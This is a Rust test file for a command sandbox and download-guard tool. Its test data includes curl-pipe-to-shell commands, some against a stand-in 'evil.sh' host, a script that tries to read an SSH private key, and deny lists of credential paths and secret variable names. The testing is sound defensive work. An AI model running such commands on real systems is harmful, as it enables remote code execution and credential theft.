use super::*;

fn decl(network: &str, write: &[&str]) -> SandboxDecl {
    SandboxDecl {
        fs: Some(super::super::plugin::SandboxFs {
            write: write.iter().map(|s| s.to_string()).collect(),
        }),
        network: Some(network.to_string()),
    }
}

/// S5b — profile golden snapshot (fixed input → stable line by line).
#[test]
fn sandbox_profile_golden() {
    let d = Path::new("/Users/test/.opencapx/plugin-data/com.example.sb");
    let got = sandbox_profile_for(d, &decl("none", &["plugin-data"]));
    let want = "\
(version 1)
(deny default)
(allow process*)
(allow sysctl-read)
(allow mach-lookup)
(allow file-read*)
(allow file-write* (literal \"/dev/null\") (subpath \"/dev/fd\"))
(allow file-write* (subpath \"/Users/test/.opencapx/plugin-data/com.example.sb\"))
(deny network*)
";
    assert_eq!(got, want);
    // network=out → allow; no write declaration → no write rule
    let out = sandbox_profile_for(d, &decl("out", &[]));
    assert!(out.ends_with("(allow network*)\n"), "{}", out);
    assert!(
        !out.contains("plugin-data"),
        "no declaration means no write is opened:\n{}",
        out
    );
}

/// S5c — enforcement policy matrix: the three factors declaration/trust/switch.
#[test]
fn sandbox_effective_policy_matrix() {
    if !cfg!(target_os = "macos") {
        eprintln!("skip: sandbox execution is macOS-only");
        return;
    }
    let d = decl("none", &["plugin-data"]);
    // Not declared → None
    assert!(effective_profile("com.x", None, false, true).is_none());
    // trusted + switch off → no sandbox
    assert!(effective_profile("com.x", Some(&d), true, false).is_none());
    // trusted + switch on → sandbox
    assert!(effective_profile("com.x", Some(&d), true, true).is_some());
    // not trusted → forced (sandboxed even with the switch off)
    assert!(effective_profile("com.x", Some(&d), false, false).is_some());
}

#[test]
fn profile_with_lists_each_write_path_and_escapes_quotes() {
    let p = profile_with(
        &[PathBuf::from("/tmp/a\"b"), PathBuf::from("/data/work")],
        false,
    );
    assert!(p.contains("(allow file-write* (subpath \"/tmp/a\\\"b\"))"));
    assert!(p.contains("(allow file-write* (subpath \"/data/work\"))"));
    assert!(p.contains("(deny network*)"));
    assert!(!p.contains("(allow network*)"));
    let allow = profile_with(&[], true);
    assert!(allow.contains("(allow network*)"));
    assert!(!allow.contains("(deny network*)"));
}

#[test]
fn parse_rejects_unknown_flag_and_requires_command() {
    assert!(parse_args(&["--nope".into()]).is_err());
    assert!(parse_args(&[]).unwrap().command.is_empty());
}

#[test]
fn parse_splits_flags_from_command() {
    let p = parse_args(&[
        "--allow-net".into(),
        "--rw".into(),
        "/tmp/x".into(),
        "--timeout".into(),
        "5".into(),
        "--".into(),
        "sh".into(),
        "-c".into(),
        "echo hi".into(),
    ])
    .unwrap();
    assert!(p.policy.allow_net);
    assert_eq!(p.policy.rw, vec![PathBuf::from("/tmp/x")]);
    assert_eq!(p.timeout_secs, Some(5));
    assert_eq!(p.command, vec!["sh", "-c", "echo hi"]);

    let p2 = parse_args(&["sh".into(), "-c".into(), "echo hi".into()]).unwrap();
    assert_eq!(p2.command, vec!["sh", "-c", "echo hi"]);
}

/// Whether this machine can actually execute the guarded path (macOS: seatbelt present;
/// Linux: bwrap + namespaces; other platforms: never).
fn backend_ready() -> bool {
    run_cli(&["--check".to_string()]) == 0
}

/// Exit-code passthrough. The command is a POSIX shell: on Windows the equivalent proof lives
/// in `appcontainer_forwards_exit_code` below, which drives `cmd`.
#[cfg(unix)]
#[test]
fn cli_forwards_exit_code() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    assert_eq!(
        run_cli(&["--".into(), "sh".into(), "-c".into(), "exit 7".into()]),
        7
    );
}

/// The fence, end to end: a write outside the scratch dir must die, not land on the host.
/// Target CWD (writable unsandboxed, not on the allow list) so the assertion is sharp. POSIX
/// shell; the Windows proof is `appcontainer_blocks_writes_outside_scratch`.
#[cfg(unix)]
#[test]
fn cli_blocks_writes_outside_scratch() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    let name = format!(".ocx-sandbox-deny-{}", std::process::id());
    let code = run_cli(&[
        "--".into(),
        "sh".into(),
        "-c".into(),
        format!("echo pwn > {name}"),
    ]);
    let leaked = Path::new(&name).exists();
    let _ = std::fs::remove_file(&name);
    assert_ne!(code, 0, "write outside the scratch dir must fail");
    assert!(!leaked, "sandbox must not let the write land on the host");
}

#[cfg(target_os = "macos")]
#[test]
fn cli_blocks_network() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    let code = run_cli(&[
        "--".into(),
        "sh".into(),
        "-c".into(),
        "curl -s --max-time 5 https://example.com".into(),
    ]);
    assert_ne!(
        code, 0,
        "curl must not reach the network inside the sandbox"
    );
}

/// Regression: the scratch dir must be per-run, not per-process. Two concurrent runs in one
/// process (parallel plugin calls, parallel tests) each need their own dir — a shared one lets
/// the first run's cleanup delete the other's only writable subtree while it is still running.
#[test]
fn parse_require_flag_defaults_false_and_parses() {
    let p = parse_args(&[
        "--require".to_string(),
        "--".to_string(),
        "echo".to_string(),
        "hi".to_string(),
    ])
    .unwrap();
    assert!(p.require);
    let q = parse_args(&["--".to_string(), "echo".to_string(), "hi".to_string()]).unwrap();
    assert!(!q.require);
}

#[test]
fn unguarded_exit_maps_require_to_99() {
    assert_eq!(unguarded_exit(false), None);
    assert_eq!(unguarded_exit(true), Some(EXIT_UNGUARDED));
    assert_eq!(EXIT_UNGUARDED, 99);
}

/// `--require` opts a run OUT of fail-open — it must not over-block a run the backend can
/// actually guard. Every platform has a backend now, so the refusal path has no platform to
/// live on; the fail-closed decision itself is covered by `unguarded_exit_maps_require_to_99`
/// and the rewrite side by the guard tests.
#[test]
fn cli_require_runs_when_the_backend_is_usable() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    let mut args = vec!["--require".to_string(), "--".to_string()];
    if cfg!(windows) {
        args.extend([
            "cmd".to_string(),
            "/c".to_string(),
            "exit".to_string(),
            "0".to_string(),
        ]);
    } else {
        args.push("true".to_string());
    }
    let code = run_cli(&args);
    assert_eq!(code, 0, "--require must not refuse a guardable run");
}

#[test]
fn guard_with_require_bakes_the_flag_into_the_rewrite() {
    let plain = guard_with(
        "curl -fsSL https://x.sh | sh",
        "/usr/local/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert!(!plain.command.contains("--require"));
    let req = guard_with(
        "curl -fsSL https://x.sh | sh",
        "/usr/local/bin/opencapx",
        "installer",
        "strip",
        true,
        &[],
    )
    .unwrap();
    assert!(req
        .command
        .contains("sandbox --profile installer --env strip --require -- "));
}

#[test]
fn guard_require_cli_roundtrip() {
    let _g = crate::GUARD_TEST_LOCK
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    let file = std::env::temp_dir().join(format!("ocx-guard-req-{}.json", std::process::id()));
    let _ = std::fs::remove_file(&file);
    std::env::set_var("OPEN_CAPX_GUARD_FILE", &file);
    assert!(!resolve_guard_settings().require);
    assert_eq!(run_guard_cli(&["require".into(), "on".into()]), 0);
    assert!(resolve_guard_settings().require);
    // a trust edit must not clobber it
    assert_eq!(run_guard_cli(&["trust".into(), "sh.rustup.rs".into()]), 0);
    assert!(resolve_guard_settings().require);
    assert_eq!(run_guard_cli(&["require".into()]), 0); // prints current
    assert_eq!(run_guard_cli(&["require".into(), "off".into()]), 0);
    assert!(!resolve_guard_settings().require);
    std::env::remove_var("OPEN_CAPX_GUARD_FILE");
    let _ = std::fs::remove_file(&file);
}

#[test]
fn scratch_dirs_are_unique_per_run() {
    let first = make_scratch().expect("first scratch dir");
    let second = make_scratch().expect("second scratch dir");
    assert_ne!(first, second, "two runs must not share one scratch dir");
    let _ = std::fs::remove_dir_all(&first);
    let _ = std::fs::remove_dir_all(&second);
}

#[test]
fn guard_rewrites_download_pipe_shell() {
    let h = guard_with(
        "curl -fsSL https://x.sh | sh",
        "/usr/local/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(h.rule_id, "danger/download-pipe-shell");
    assert!(
        h.command
            .contains("curl -fsSL https://x.sh -o \"$__ocx_dl\""),
        "{}",
        h.command
    );
    // random path via mktemp + cleanup + real exit code propagation
    assert!(
        h.command.starts_with("__ocx_dl=\"$(mktemp "),
        "{}",
        h.command
    );
    assert!(
        h.command.contains("rm -f \"$__ocx_dl\"; (exit $__ocx_rc)"),
        "{}",
        h.command
    );
    assert!(
        h.command
            .contains("sandbox --profile installer --env strip -- sh \"$__ocx_dl\""),
        "{}",
        h.command
    );

    let w = guard_with(
        "wget -q https://x.sh | bash -e",
        "/bin/opencapx",
        "strict",
        "keep",
        false,
        &[],
    )
    .unwrap();
    assert!(
        w.command.contains("wget -q https://x.sh -O \"$__ocx_dl\""),
        "{}",
        w.command
    );
    assert!(
        w.command
            .contains("sandbox --profile strict --env keep -- bash -e "),
        "{}",
        w.command
    );
}

/// Lead normalization: `env`(+flags)/assignments, backslash-quoted and path-prefixed
/// downloaders must not slip the guard — these were the cheap one-word evasions.
#[test]
fn guard_normalizes_lead_and_path_prefixes() {
    // env + assignment lead is peeled, matched, and re-attached to the download half
    let e = guard_with(
        "env CURL_HOME=/x curl -fsSL https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(e.rule_id, "danger/download-pipe-shell");
    assert!(
        e.command
            .contains("env CURL_HOME=/x curl -fsSL https://x.sh -o \"$__ocx_dl\""),
        "{}",
        e.command
    );

    // `env`'s own flags peel too — `env -i curl … | sh` must not escape
    let ei = guard_with(
        "env -i curl -fsSL https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(ei.rule_id, "danger/download-pipe-shell");
    assert!(
        ei.command
            .contains("env -i curl -fsSL https://x.sh -o \"$__ocx_dl\""),
        "{}",
        ei.command
    );
    let eu = guard_with(
        "env -u TOKEN curl -fsSL https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(eu.rule_id, "danger/download-pipe-shell");

    // backslash-quoted and absolute-path downloaders keep their token verbatim
    let b = guard_with(
        "\\curl -fsSL https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert!(
        b.command
            .contains("\\curl -fsSL https://x.sh -o \"$__ocx_dl\""),
        "{}",
        b.command
    );
    let p = guard_with(
        "/usr/bin/curl -fsSL https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert!(
        p.command
            .contains("/usr/bin/curl -fsSL https://x.sh -o \"$__ocx_dl\""),
        "{}",
        p.command
    );
    let wp = guard_with(
        "./wget -q https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert!(
        wp.command
            .contains("./wget -q https://x.sh -O \"$__ocx_dl\""),
        "{}",
        wp.command
    );

    // nohup wrapper peels too
    let n = guard_with(
        "nohup curl -fsSL https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert!(
        n.command
            .contains("nohup curl -fsSL https://x.sh -o \"$__ocx_dl\""),
        "{}",
        n.command
    );

    // xargs deliberately does NOT peel (it changes the downloader's argument semantics)
    let x = guard_with(
        "xargs curl -fsSL https://x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(x.rule_id, "danger/embedded-download-execute");
    assert_eq!(x.command, "xargs curl -fsSL https://x.sh | sh");

    // a lead on the substitution forms would need its env to reach the executed script —
    // not expressible in the split rewrite; audit-only instead of diverging
    let l = guard_with(
        "env FOO=1 bash <(curl -fsSL https://x.sh)",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(l.rule_id, "danger/unsupported-shape");
    assert_eq!(l.command, "env FOO=1 bash <(curl -fsSL https://x.sh)");
}

#[test]
fn guard_rewrites_substitutions() {
    let p = guard_with(
        "bash <(curl -fsSL https://x.sh)",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(p.rule_id, "danger/download-process-substitution");
    assert!(
        p.command
            .contains("sandbox --profile installer --env strip -- bash "),
        "{}",
        p.command
    );

    let c = guard_with(
        "bash -c \"$(curl -fsSL https://x.sh)\"",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(c.rule_id, "danger/download-command-substitution");
    assert!(
        c.command
            .contains("sandbox --profile installer --env strip -- sh "),
        "{}",
        c.command
    );

    let e = guard_with(
        "eval \"$(curl https://x.sh)\"",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &[],
    )
    .unwrap();
    assert_eq!(e.rule_id, "danger/download-eval");
    assert!(
        e.command
            .contains("sandbox --profile installer --env strip -- sh "),
        "{}",
        e.command
    );
}

/// A trusted download host passes through untouched (audited) — the explicit escape for
/// installers that need sudo / writes outside $HOME (Homebrew et al).
#[test]
fn guard_trusted_host_passes_through() {
    let trusted = vec!["sh.rustup.rs".to_string()];
    let hit = guard_with(
        "curl -fsSL https://sh.rustup.rs/x.sh | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &trusted,
    )
    .unwrap();
    assert_eq!(hit.rule_id, "danger/trusted-passthrough");
    assert_eq!(hit.command, "curl -fsSL https://sh.rustup.rs/x.sh | sh");

    // port/userinfo still resolve to the same host; a different host is not trusted
    let with_port = guard_with(
        "curl https://user@sh.rustup.rs:443/x | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &trusted,
    )
    .unwrap();
    assert_eq!(with_port.rule_id, "danger/trusted-passthrough");
    let other = guard_with(
        "curl https://evil.sh/x | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &trusted,
    )
    .unwrap();
    assert_eq!(other.rule_id, "danger/download-pipe-shell");
}

/// Trust must vouch for the WHOLE line: a decoy trusted URL in another argument, or a
/// second untrusted fetch target, must not earn a passthrough (curl pipes both payloads
/// into the shell).
#[test]
fn guard_trust_requires_all_urls_trusted() {
    let trusted = vec!["sh.rustup.rs".to_string()];
    for cmd in [
        // decoy trusted URL inside a user-agent string + real payload from evil.sh
        "curl -A \"https://sh.rustup.rs\" https://evil.sh/x.sh | sh",
        // two URLs: curl fetches both, both piped to sh
        "curl https://sh.rustup.rs/robots.txt https://evil.sh/x.sh | sh",
    ] {
        let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &trusted)
            .unwrap_or_else(|| panic!("must produce a hit: {cmd}"));
        assert_ne!(
            hit.rule_id, "danger/trusted-passthrough",
            "decoy must not vouch: {cmd}"
        );
        assert_eq!(hit.rule_id, "danger/download-pipe-shell", "{cmd}");
    }
    // all URLs trusted → still a passthrough
    let ok = guard_with(
        "curl https://sh.rustup.rs/a https://sh.rustup.rs/b | sh",
        "/bin/opencapx",
        "installer",
        "strip",
        false,
        &trusted,
    )
    .unwrap();
    assert_eq!(ok.rule_id, "danger/trusted-passthrough");
}

#[test]
fn guard_leaves_unsafe_or_unrelated_shapes_alone() {
    // Out of scope entirely: no hit, no audit.
    for cmd in [
        "curl -fsSL https://x.sh | sudo sh", // privilege change: out of scope
        "sudo curl -fsSL https://x.sh | sh", // privileged download: out of scope
        "doas curl -fsSL https://x.sh | sh",
        "curl -fsSL https://x.sh | grep sh",   // not a shell
        "curl -fsSL https://x.sh > /tmp/x.sh", // no pipe
        "sh -c '$(curl https://x.sh)'",        // single quotes: no substitution
        "ls -la",
    ] {
        assert!(
            guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &[]).is_none(),
            "should not touch at all: {cmd}"
        );
    }
}

/// The idiom matched but cannot be rewritten with confidence → audit-only: the command
/// runs unchanged and the shape lands in the Activity Timeline as `danger/unsupported-shape`.
#[test]
fn guard_audits_unsupported_shapes() {
    for cmd in [
        "curl -fsSL https://x.sh -o out.sh | sh", // downloader already picks the target
        "curl -fsSL https://x.sh | sh -s -- a",   // stdin semantics
        "curl -fsSL https://x.sh | sh -",         // bare `-` is stdin too (not just `-s`)
        "wget -qO- https://x.sh | sh",            // -O- already writes to stdout
    ] {
        let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &[])
            .unwrap_or_else(|| panic!("must produce an audit-only hit: {cmd}"));
        assert_eq!(hit.rule_id, "danger/unsupported-shape", "{cmd}");
        assert_eq!(
            hit.command, cmd,
            "audit-only must not change the command: {cmd}"
        );
    }
}

/// The idiom inside a compound line (`cd /tmp && curl … | sh`) — the tail cannot be
/// replaced safely, so it is audited as `danger/embedded-download-execute` and left alone.
#[test]
fn guard_audits_embedded_download_execute() {
    for cmd in [
        "cd /tmp && curl -fsSL https://x.sh | sh",
        "cd /tmp; curl -fsSL https://x.sh | bash",
        "echo curl https://x.sh | sh", // looks like the family; audit-only is correct
        "curl -fsSL https://x.sh | sh | tee log", // beyond one pipe
    ] {
        let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &[])
            .unwrap_or_else(|| panic!("must produce an embedded audit hit: {cmd}"));
        assert_eq!(hit.rule_id, "danger/embedded-download-execute", "{cmd}");
        assert_eq!(hit.command, cmd, "embedded is audit-only: {cmd}");
    }
}

/// Installer profile shape: network open, $HOME writable, and the deny list comes AFTER the
/// allows — seatbelt last-match-wins, so the ordering is the enforcement.
#[cfg(target_os = "macos")] // seatbelt profile text exists only on macOS
#[test]
fn installer_profile_denies_after_allowing() {
    let home = PathBuf::from("/Users/test");
    let scratch = PathBuf::from("/tmp/ocx-scratch");
    let p = cli_profile(Mode::Installer, &home, &scratch, None, &[], false);
    assert!(p.contains("(allow network*)"));
    assert!(p.contains("(allow file-write* (subpath \"/Users/test\"))"));
    let allow_home = p
        .find("(allow file-write* (subpath \"/Users/test\"))")
        .unwrap();
    let deny_ssh = p
        .find("(deny file-read* (subpath \"/Users/test/.ssh\"))")
        .unwrap();
    let deny_rc = p
        .find("(deny file-write* (subpath \"/Users/test/.zshrc\"))")
        .unwrap();
    assert!(
        deny_ssh > allow_home && deny_rc > allow_home,
        "denies must come after the allows:\n{p}"
    );
    assert!(p.contains("(deny file-write* (subpath \"/Library/LaunchAgents\"))"));
    // cloud CLI / VCS credential stores — the exfiltration targets installer mode must close
    assert!(
        p.contains("(deny file-read* (subpath \"/Users/test/.kube\"))"),
        "{p}"
    );
    assert!(
        p.contains("(deny file-read* (subpath \"/Users/test/.git-credentials\"))"),
        "{p}"
    );
    assert!(
        p.contains("(deny file-read* (subpath \"/Users/test/.config/gcloud\"))"),
        "{p}"
    );
    assert!(
        p.contains("(deny file-read* (subpath \"/Users/test/.azure\"))"),
        "{p}"
    );
    assert!(
        p.contains(
            "(deny file-read* (subpath \"/Users/test/Library/Application Support/Google/Chrome\"))"
        ),
        "{p}"
    );

    let s = cli_profile(Mode::Strict, &home, &scratch, None, &[], false);
    assert!(s.contains("(deny network*)"));
    assert!(
        !s.contains("(subpath \"/Users/test\")"),
        "strict must not open $HOME:\n{s}"
    );
    let s_net = cli_profile(Mode::Strict, &home, &scratch, None, &[], true);
    assert!(s_net.contains("(allow network*)"));
}

/// Live proof that the generated installer profile enforces the deny list against a
/// throwaway home: secrets unreadable, rc files unwritable, ordinary files fine.
#[cfg(target_os = "macos")]
#[test]
fn installer_profile_enforces_deny_list_live() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    let home = std::env::temp_dir().join(format!("ocx-fake-home-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&home);
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::write(home.join(".ssh/id_rsa"), "SECRET").unwrap();
    std::fs::write(home.join(".zshrc"), "# rc\n").unwrap();
    let scratch = std::env::temp_dir().join(format!("ocx-fake-scratch-{}", std::process::id()));
    std::fs::create_dir_all(&scratch).unwrap();
    let profile = cli_profile(
        Mode::Installer,
        &canonicalize_lossy(&home),
        &scratch,
        None,
        &[],
        false,
    );
    let script = format!(
        "cat {h}/.ssh/id_rsa > /dev/null && echo READ_OK || echo READ_BLOCKED; \
             echo x >> {h}/.zshrc && echo RC_OK || echo RC_BLOCKED; \
             echo ok > {h}/installed.txt && echo WRITE_OK || echo WRITE_BLOCKED",
        h = home.display()
    );
    let out = std::process::Command::new("/usr/bin/sandbox-exec")
        .arg("-p")
        .arg(&profile)
        .arg("--")
        .arg("sh")
        .arg("-c")
        .arg(&script)
        .output()
        .expect("sandbox-exec run");
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("READ_BLOCKED"),
        "secret read must be denied:\n{stdout}"
    );
    assert!(
        stdout.contains("RC_BLOCKED"),
        "rc write must be denied:\n{stdout}"
    );
    assert!(
        stdout.contains("WRITE_OK"),
        "ordinary home writes must work:\n{stdout}"
    );
    assert_eq!(
        std::fs::read_to_string(home.join(".zshrc")).unwrap(),
        "# rc\n"
    );
    let _ = std::fs::remove_dir_all(&home);
    let _ = std::fs::remove_dir_all(&scratch);
}

/// Trust table roundtrip through the CLI, against a throwaway file.
#[test]
fn guard_trust_cli_roundtrip() {
    // Both guard-file tests flip the process-global OPEN_CAPX_GUARD_FILE — serialize
    // against each other AND against main's danger-guard hook test (shared crate lock).
    let _g = crate::GUARD_TEST_LOCK
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    let file = std::env::temp_dir().join(format!("ocx-guard-{}.json", std::process::id()));
    let _ = std::fs::remove_file(&file);
    std::env::set_var("OPEN_CAPX_GUARD_FILE", &file);
    assert_eq!(run_guard_cli(&["trust".into(), "sh.rustup.rs".into()]), 0);
    assert_eq!(load_trusted(), vec!["sh.rustup.rs".to_string()]);
    assert_eq!(run_guard_cli(&["trust".into(), "sh.rustup.rs".into()]), 0);
    assert_eq!(run_guard_cli(&["list".into()]), 0);
    assert_eq!(run_guard_cli(&["untrust".into(), "sh.rustup.rs".into()]), 0);
    assert!(load_trusted().is_empty());
    std::env::remove_var("OPEN_CAPX_GUARD_FILE");
    let _ = std::fs::remove_file(&file);
}

/// `guard mode` persists the stance, a trust edit must not clobber it, the file is 0600,
/// and `resolve_guard_settings` applies env > file > default precedence.
#[test]
fn guard_mode_roundtrip_and_precedence() {
    let _g = crate::GUARD_TEST_LOCK
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    let file = std::env::temp_dir().join(format!("ocx-guard-mode-{}.json", std::process::id()));
    let _ = std::fs::remove_file(&file);
    std::env::set_var("OPEN_CAPX_GUARD_FILE", &file);

    // default: on, installer, strip
    assert_eq!(
        resolve_guard_settings(),
        GuardSettings {
            enabled: true,
            profile: "installer",
            env: "strip",
            require: false
        }
    );
    // file sets strict
    assert_eq!(run_guard_cli(&["mode".into(), "strict".into()]), 0);
    assert_eq!(
        resolve_guard_settings(),
        GuardSettings {
            enabled: true,
            profile: "strict",
            env: "strip",
            require: false
        }
    );
    // a trust edit preserves the mode field
    assert_eq!(run_guard_cli(&["trust".into(), "x.sh".into()]), 0);
    assert_eq!(
        resolve_guard_settings(),
        GuardSettings {
            enabled: true,
            profile: "strict",
            env: "strip",
            require: false
        },
        "trust edit must not clobber danger_guard"
    );
    assert_eq!(load_trusted(), vec!["x.sh".to_string()]);
    // guard env persists alongside, and survives a mode edit
    assert_eq!(run_guard_cli(&["env".into(), "keep".into()]), 0);
    assert_eq!(
        resolve_guard_settings(),
        GuardSettings {
            enabled: true,
            profile: "strict",
            env: "keep",
            require: false
        }
    );
    assert_eq!(run_guard_cli(&["mode".into(), "off".into()]), 0);
    assert_eq!(
        resolve_guard_settings(),
        GuardSettings {
            enabled: false,
            profile: "installer",
            env: "keep",
            require: false
        },
        "mode edit must not clobber env"
    );
    assert_eq!(run_guard_cli(&["env".into(), "strip".into()]), 0);
    // env var beats file; case-insensitive on both sources
    std::env::set_var("OPEN_CAPX_DANGER_GUARD", "Strict");
    assert_eq!(
        resolve_guard_settings(),
        GuardSettings {
            enabled: true,
            profile: "strict",
            env: "strip",
            require: false
        },
        "Strict must resolve to strict, not silently back to installer"
    );
    std::env::set_var("OPEN_CAPX_DANGER_GUARD", "OFF");
    assert!(!resolve_guard_settings().enabled, "OFF must disable");
    std::env::remove_var("OPEN_CAPX_DANGER_GUARD");
    // file off → disabled; bad values rejected
    assert_eq!(run_guard_cli(&["mode".into(), "off".into()]), 0);
    assert!(!resolve_guard_settings().enabled);
    assert_eq!(run_guard_cli(&["mode".into(), "yolo".into()]), 2);
    assert_eq!(run_guard_cli(&["env".into(), "leak".into()]), 2);

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&file).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600, "guard.json must be owner-only");
    }

    std::env::remove_var("OPEN_CAPX_GUARD_FILE");
    let _ = std::fs::remove_file(&file);
}

/// Secret-looking env names are stripped by default; ordinary ones survive.
#[test]
fn env_policy_classifies_secret_names() {
    for name in [
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "GITHUB_TOKEN",
        "github_pat",
        "GITHUB_PAT",
        "SSH_AUTH_SOCK",
        "GIT_ASKPASS",
        "DOCKER_REGISTRY_PASSWORD",
        "MY_service_credentials",
        "HF_KEY", // bare *_KEY suffix, no API_/PRIVATE_ prefix
    ] {
        assert!(env_is_secret(name), "must be classified secret: {name}");
    }
    for name in [
        "PATH",
        "HOME",
        "TMPDIR",
        "http_proxy",
        "RUST_LOG",
        "NVM_DIR",
        "LC_ALL",
        "MONKEY",
    ] {
        assert!(!env_is_secret(name), "must stay visible: {name}");
    }
}

/// `--env` parses; default is Strip.
#[test]
fn parse_env_flag_defaults_to_strip() {
    assert_eq!(
        parse_args(&["--".into(), "ls".into()]).unwrap().policy.env,
        EnvPolicy::Strip
    );
    let p = parse_args(&["--env".into(), "keep".into(), "--".into(), "ls".into()]).unwrap();
    assert_eq!(p.policy.env, EnvPolicy::Keep);
    let p = parse_args(&["--env".into(), "clear".into(), "--".into(), "ls".into()]).unwrap();
    assert_eq!(p.policy.env, EnvPolicy::Clear);
    assert!(parse_args(&["--env".into(), "leak".into(), "--".into(), "ls".into()]).is_err());
}

/// bwrap installer overlays: only host paths that actually exist are shadowed (bwrap needs
/// the mountpoint in the ro root bind; a missing path has nothing to protect), and file
/// targets get the /dev/null treatment instead of a tmpfs (a tmpfs is a directory —
/// mounting it over a file errors and fails the whole bwrap run open).
#[test]
fn installer_overlays_cover_existing_paths_only() {
    let home = std::env::temp_dir().join(format!("ocx-overlays-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&home);
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::create_dir_all(home.join(".kube")).unwrap();
    std::fs::write(home.join(".zshrc"), "# rc\n").unwrap();
    let ov = installer_overlays(&home);
    assert!(ov.contains(&(home.join(".ssh"), Overlay::Tmpfs)), "{ov:?}");
    assert!(ov.contains(&(home.join(".kube"), Overlay::Tmpfs)), "{ov:?}");
    assert!(
        ov.contains(&(home.join(".zshrc"), Overlay::DevNull)),
        "{ov:?}"
    );
    assert!(
        !ov.iter().any(|(p, _)| *p == home.join(".gnupg")),
        "missing path must be skipped: {ov:?}"
    );
    let _ = std::fs::remove_dir_all(&home);
}

// ---------------------------------------------------------------------------
// Windows AppContainer (W1)
// ---------------------------------------------------------------------------

use super::appcontainer::{
    capabilities_for, deny_paths, grant_paths, profile_plan, DenyKind, INTERNET_CLIENT_SID,
};

/// A throwaway home path. The mapping is asserted on the tail of each mapped path, so the test
/// means the same thing on the Windows build (where the join is a native `\`) and on the macOS
/// and Linux builds that only compile the pure half.
const WIN_HOME: &str = "C:\\Users\\t";

fn ends_with_rel(p: &str, rel: &str) -> bool {
    p.ends_with(&rel.replace('/', "\\"))
}

/// Strict fences the writes to scratch + `--rw`; installer mode adds `$HOME` (installers
/// install). A `--rw` that repeats the scratch dir or the home must not produce a second ACE.
#[test]
fn appcontainer_grants_scratch_rw_and_installer_home_without_duplicates() {
    let scratch = PathBuf::from("/tmp/scratch");
    let home = PathBuf::from("/tmp/home");
    let rw = vec![PathBuf::from("/tmp/rw1"), PathBuf::from("/tmp/rw2")];
    assert_eq!(
        grant_paths(Mode::Strict, &scratch, &rw, Some(&home)),
        vec![
            scratch.clone(),
            PathBuf::from("/tmp/rw1"),
            PathBuf::from("/tmp/rw2")
        ],
        "strict mode must not reach $HOME"
    );
    let installer = grant_paths(Mode::Installer, &scratch, &[], Some(&home));
    assert_eq!(
        installer,
        vec![scratch.clone(), home.clone()],
        "installer mode grants scratch + $HOME"
    );
    assert_eq!(
        grant_paths(
            Mode::Installer,
            &scratch,
            &[scratch.clone(), home.clone()],
            Some(&home)
        ),
        vec![scratch.clone(), home.clone()],
        "a --rw repeating an already-granted path must not double the ACE"
    );
    assert_eq!(
        grant_paths(Mode::Installer, &scratch, &[], None),
        vec![scratch],
        "no resolvable home means no $HOME grant"
    );
}

/// The shared deny list has to survive the mapping with Windows separators, drop the
/// macOS-only entries, and pick up the Windows equivalents — and each path has to keep the
/// label of the half it came from, because that is what the plan prints for review.
#[test]
fn appcontainer_deny_paths_map_the_shared_list_and_drop_macos_only_entries() {
    let home = Path::new(WIN_HOME);
    let mapped: Vec<(String, DenyKind)> = deny_paths(home)
        .into_iter()
        .map(|(p, k)| (p.to_string_lossy().into_owned(), k))
        .collect();
    let kind_of = |rel: &str| {
        mapped
            .iter()
            .find(|(p, _)| ends_with_rel(p, rel))
            .map(|(_, k)| *k)
    };
    // shared entries, re-joined with `\`
    assert_eq!(kind_of(".ssh"), Some(DenyKind::Secret));
    assert_eq!(kind_of(".docker/config.json"), Some(DenyKind::Secret));
